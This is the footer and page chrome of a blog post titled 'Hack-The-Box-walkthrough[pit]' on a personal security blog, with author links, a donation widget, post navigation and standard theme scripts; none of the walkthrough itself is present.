<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>lUc1f3r11
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2021/05/22/pit/" title="Hack-The-Box-walkthrough[pit]">https://fdlucifer.github.io/2021/05/22/pit/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/05/15/pivotapi/" rel="prev" title="Hack-The-Box-walkthrough[pivotapi]">
                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[pivotapi]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/05/23/knife/" rel="next" title="Hack-The-Box-walkthrough[knife]">
                  Hack-The-Box-walkthrough[knife] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">625k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">37:52</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
